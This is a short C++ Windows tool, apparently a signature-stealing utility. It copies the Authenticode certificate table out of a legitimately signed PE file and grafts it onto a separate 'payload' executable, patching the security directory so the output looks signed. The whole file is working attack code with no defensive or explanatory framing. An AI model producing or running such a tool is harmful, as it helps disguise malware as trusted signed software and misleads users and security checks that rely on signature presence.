#include <fstream>
#include <Windows.h>
#pragma warning( disable : 4996)
BYTE* MapFileMemory(LPCSTR filename, LONGLONG& filelen)
{
	FILE* fileptr;
	BYTE* buffer;

	fileptr = fopen(filename, "rb");
	fseek(fileptr, 0, SEEK_END);
	filelen = ftell(fileptr);
	rewind(fileptr);

	buffer = (BYTE*)malloc((filelen * 1) * sizeof(char));
	fread(buffer, filelen, 1, fileptr);
	fclose(fileptr);

	return buffer;
}

BYTE* rippedCert(const char* fromWhere, LONGLONG& certSize) {
	LONGLONG signedPeDataLen = 0;
	BYTE* signedPeData = MapFileMemory(fromWhere, signedPeDataLen);

	PIMAGE_NT_HEADERS nthdr = (PIMAGE_NT_HEADERS)(signedPeData + ((PIMAGE_DOS_HEADER)signedPeData)->e_lfanew);
	auto certInfo = nthdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
	certSize = certInfo.Size;
	BYTE* certData = new BYTE[certInfo.Size];
	memcpy(certData, signedPeData + certInfo.VirtualAddress, certInfo.Size);
	return certData;
}

int main(int argc, char** argv) {
	if (argc < 4) {
		printf("usage: %s [path/to/signed_pe] [path/to/payload] [where/to/output]\n", argv[0]);
		return 0;
	}

	LONGLONG certSize;
	BYTE* certData = rippedCert(argv[1], certSize);

	LONGLONG payloadSize = 0;
	BYTE* payloadPeData = MapFileMemory(argv[2], payloadSize);

	BYTE* finalPeData = new BYTE[payloadSize + certSize];
	memcpy(finalPeData, payloadPeData, payloadSize);

	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(finalPeData + ((PIMAGE_DOS_HEADER)finalPeData)->e_lfanew);
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = payloadSize;
	ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size = certSize;
	memcpy(finalPeData + payloadSize, certData, certSize);

	FILE* fp = fopen(argv[3], "wb");
	fwrite(finalPeData, payloadSize + certSize, 1, fp);
	puts("done.");
}